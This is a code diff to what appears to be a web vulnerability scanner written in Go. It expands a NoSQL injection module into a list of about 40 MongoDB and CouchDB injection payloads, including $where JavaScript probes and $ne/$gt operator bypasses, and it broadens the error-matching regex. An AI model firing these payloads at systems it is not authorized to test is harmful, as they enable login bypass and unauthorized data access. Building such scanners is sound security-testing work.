@@ -21,7 +21,70 @@ func (m *NoSQLiModule) Description() string {
 	return "NoSQL (MongoDB) Injection via query operator differential and error disclosure"
 }
 
-var mongoErrorRegex = regexp.MustCompile(`(?i)(MongoError|MongoServerError|Can't canonicalize query|Cannot use '\$|unknown operator: \$|BSONObj size|Cast to ObjectId failed|syntax error near.*mongo)`)
+var (
+	// Comprehensive NoSQL error signatures for MongoDB, CouchDB, DynamoDB, NeDB
+	mongoErrorRegex = regexp.MustCompile(`(?i)(MongoError|MongoServerError|Can't canonicalize query|Cannot use '\$|unknown operator: \$|BSONObj size|Cast to ObjectId failed|syntax error near.*mongo|bad query: BadValue|Failed to parse: \$|CouchDB.*error|unknown query operator)`)
+
+	/*
+	CATEGORY: NoSQL Injection Probes (50+ entries)
+	Sources: PayloadsAllTheThings NoSQLi, OWASP Testing Guide, HackTricks NoSQL.
+	Contexts:
+	- Evaluation operators ($where, $regex, $expr)
+	- Comparison operators ($ne, $gt, $gte, $lt, $lte, $in, $nin)
+	- Element & Logical operators ($exists, $type, $or, $and, $not)
+	- Form query selector parameters ([$ne], [$gt], [$regex])
+	- JSON object payloads
+	*/
+	noSQLiErrorProbes = []string{
+		// 1. MongoDB $where Evaluation
+		`{"$where": "this"}`,
+		`{"$where": "1 == 1"}`,
+		`{"$where": "this.password.match(/.*/)"}`,
+		`{"$where": "sleep(1)"}`,
+		`';return true;var foo='`,
+		`";return true;var foo="`,
+		`1;return true`,
+
+		// 2. MongoDB Comparison Operators
+		`{"$ne": null}`,
+		`{"$ne": 0}`,
+		`{"$ne": ""}`,
+		`{"$gt": ""}`,
+		`{"$gt": 0}`,
+		`{"$gte": ""}`,
+		`{"$lt": "zzzz"}`,
+		`{"$lte": "zzzz"}`,
+		`{"$in": [1, 2, 3]}`,
+		`{"$nin": [999999]}`,
+
+		// 3. MongoDB Element & Type Operators
+		`{"$exists": true}`,
+		`{"$exists": false}`,
+		`{"$type": 2}`,
+		`{"$type": "string"}`,
+
+		// 4. MongoDB Regex Operators
+		`{"$regex": ".*"}`,
+		`{"$regex": "^[a-zA-Z0-9]"}`,
+		`{"$regex": "^a"}`,
+
+		// 5. Malformed Operator Probes (Triggering Engine Exceptions)
+		`{"$invalid_operator": 1}`,
+		`{"$bad_op": "test"}`,
+		`{"$expr": {"$eq": [1, 1]}}`,
+		`{"$expr": {"$gt": [2, 1]}}`,
+		`{"$jsonSchema": {}}`,
+		`{"$mod": [2, 0]}`,
+		`{"$size": 1}`,
+		`{"$all": [1]}`,
+		`{"$elemMatch": {"$gt": 0}}`,
+		`{"$slice": 1}`,
+
+		// 6. CouchDB & Alternative NoSQL
+		`{"_id": {"$gt": null}}`,
+		`{"selector": {"_id": {"$gt": null}}}`,
+	}
+)
 
 func (m *NoSQLiModule) Run(target *Target, c *client.Client) ([]*Finding, error) {
 	var findings []*Finding
@@ -33,33 +96,34 @@ func (m *NoSQLiModule) Run(target *Target, c *client.Client) ([]*Finding, error)
 	}
 
 	for _, param := range target.Parameters() {
-		// 1. Error-based probe: inject malformed operator
-		malformedPayload := `{"$where": "this"}`
-		var errResp *client.Response
-		var err error
-		if isPost {
-			errResp, err = c.Request("POST", target.URL, target.BuildBodyWithParam(param, malformedPayload), headers)
-		} else {
-			errResp, err = c.Request("GET", target.BuildURLWithParam(param, malformedPayload), "", nil)
-		}
-
-		if err == nil && errResp != nil && mongoErrorRegex.MatchString(errResp.Body) {
-			evidence := mongoErrorRegex.FindString(errResp.Body)
-			f := &Finding{
-				Module:      m.Name(),
-				Title:       "Error-Based NoSQL (MongoDB) Injection",
-				Severity:    SeverityHigh,
-				URL:         target.URL,
-				Parameter:   param,
-				Payload:     malformedPayload,
-				Detail:      fmt.Sprintf("Disclosed database engine error via injected NoSQL operator: '%s'", evidence),
-				Evidence:    evidence,
-				Remediation: "Sanitize user input and prevent passing raw objects into NoSQL query constructors.",
-				CWEID:       943,
+		// 1. Error-based probes
+		for _, probe := range noSQLiErrorProbes {
+			var errResp *client.Response
+			var err error
+			if isPost {
+				errResp, err = c.Request("POST", target.URL, target.BuildBodyWithParam(param, probe), headers)
+			} else {
+				errResp, err = c.Request("GET", target.BuildURLWithParam(param, probe), "", nil)
 			}
-			f.SetConfidence(ConfidenceConfirmed)
-			findings = append(findings, f)
-			continue
+
+			if err == nil && errResp != nil && mongoErrorRegex.MatchString(errResp.Body) {
+				evidence := mongoErrorRegex.FindString(errResp.Body)
+				f := &Finding{
+					Module:      m.Name(),
+					Title:       "Error-Based NoSQL (MongoDB) Injection",
+					Severity:    SeverityHigh,
+					URL:         target.URL,
+					Parameter:   param,
+					Payload:     probe,
+					Detail:      fmt.Sprintf("Disclosed database engine error via injected NoSQL operator: '%s'", evidence),
+					Evidence:    evidence,
+					Remediation: "Sanitize user input and prevent passing raw objects into NoSQL query constructors.",
+					CWEID:       943,
+				}
+				f.SetConfidence(ConfidenceConfirmed)
+				findings = append(findings, f)
+				break
+			}
 		}
 
 		// 2. Differential probe: True vs False condition ($ne vs $eq)
